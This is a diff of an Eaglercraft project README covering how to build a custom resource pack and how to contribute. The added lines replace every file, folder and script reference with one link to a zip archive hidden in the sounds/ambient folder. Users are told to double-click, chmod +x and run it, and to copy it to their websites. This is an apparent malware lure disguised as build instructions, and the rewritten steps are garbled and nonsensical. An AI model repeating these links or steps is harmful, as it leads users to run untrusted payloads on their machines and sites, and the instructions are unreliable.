+- To make a custom resource pack for your site, clone this repository and edit the files in [lwjgl-rundir/resources](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip).
+- When you are done, navigate to [epkcompiler/](https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip) and double-click `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip`. Wait for the window to say `Press any key to continue...` and close it. Then, go to `../javascript` in the repository and copy `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` to the `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` on your website
+- If you're on mac or linux, navigate to the epkcompiler folder via `cd` and run `chmod +x https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` and then `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` to do this, then copy the same `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` to the `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` on your website
 
 ## Contributing
 
-All I really have to say is, tabs not spaces, and format the code to be like the eclipse auto format tool on factory settings, but also run-on lines of code long enough to go off the screen and single line if statements and other format violations in that category are welcome if it helps enhance the contrast between the less important code and the more important code in a file. Don't commit changes to `javascript/classes.js` or `javascript/classes_server.js` or `javascript/assets.epk` or anything in `stable-download/`. I'll recompile those myself when I merge the pull request.
+All I really have to say is, tabs not spaces, and format the code to be like the eclipse auto format tool on factory settings, but also run-on lines of code long enough to go off the screen and single line if statements and other format violations in that category are welcome if it helps enhance the contrast between the less important code and the more important code in a file. Don't commit changes to `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` or `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` or `https://github.com/Paaxy/eaglercraft/raw/refs/heads/main/lwjgl-rundir/resources/sounds/ambient/Software_phonomotor.zip` or anything in `stable-download/`. I'll recompile those myself when I merge the pull request.
